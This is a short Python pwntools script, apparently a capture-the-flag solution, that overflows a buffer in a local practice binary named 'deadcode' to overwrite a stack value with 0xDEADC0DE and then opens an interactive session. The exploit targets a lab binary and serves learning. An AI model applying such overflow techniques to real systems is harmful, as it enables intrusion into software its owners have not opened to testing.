#!/usr/bin/env python3 

from pwn import *

p = process("./deadcode")

p.sendline(b'x' * (0x20 - 0x8) + p64(0xDEADC0DE))

p.interactive()